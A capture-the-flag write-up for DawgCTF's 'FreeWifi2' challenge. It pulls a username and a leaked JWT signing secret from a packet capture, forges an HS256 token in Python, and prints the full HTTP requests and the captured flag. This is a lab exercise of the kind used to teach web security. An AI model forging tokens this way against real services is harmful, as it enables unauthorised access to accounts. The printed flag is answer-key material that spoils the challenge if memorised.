## FreeWifi2

There is a pcap given.
On TCP Stream 48, we can find the username: *true.grit@umbccd.io*
In addition, there are three interesting endpoints in the pcap. 
You can go over all the tcp streams and eventually, you find the below details:
- /jwtlogin
- /forgotpassword.html
- /staff.html (this got a flag which is the solution for FreeWifi1.)

Trying to login with username:password as true.grit@umbccd.io:true.grit@umbccd.io gives the following token in the response:
*< JWT 'identity'=31337 >*


**HTTP Request:**

```
POST /staff.html HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 178
Origin: https://freewifi.ctf.umbccd.io
Connection: close
Referer: https://freewifi.ctf.umbccd.io/staff.html
Cookie: session=eyJjc3JmX3Rva2VuIjoiY2MwZjFmODY4ZWRiOTgzNTUxYzBhM2FiMzFmNDExODJiY2ViYTA5MyJ9.XpGbsA.Afj_d2U1FAfOy_LNDW-ucVcxN94; WifiKey nonce=MjAyMC0wNC0xMSAxMDozOA==; WifiKey alg=SHA1
Upgrade-Insecure-Requests: 1
csrf_token=ImNjMGYxZjg2OGVkYjk4MzU1MWMwYTNhYjMxZjQxMTgyYmNlYmEwOTMi.XpGeNA.1eSf_9aW6Z1u9djuBDm_N9KhO8M&username=true.grit%40umbccd.io&password=true.grit%40umbccd.io&submit=Submit
```

**HTTP Response:**
```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 11 Apr 2020 10:39:07 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAxMDozOQ==; Path=/
Set-Cookie: WifiKey alg=SHA1; Path=/
Set-Cookie: JWT 'identity'=31337; Path=/
Vary: Cookie
Content-Length: 2666
```

### Ideas:
I think the goal is to login with /jwtlogin
We have identity from the above request. In addition, there is additional information from the pcap about a secret:
```
Set-Cookie: JWT 'secret'="dawgCTF?heckin#bamboozle"; Path=/
```

Using, this two values, I tried creating a JWT token using python. 

```Python 
import jwt
print jwt.encode({'identity':31337,'exp':1614291780,'iat':1475878357,'nbf':1475878357},'dawgCTF?heckin#bamboozle',algorithm='HS256')
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA
```

Below is the request that gave me the flag: 

**HTTP Request**
```
GET /jwtlogin HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Length: 2
```

You have the flag in the reponse. 
>DawgCTF{y0u_d0wn_w!t#_JWT?}
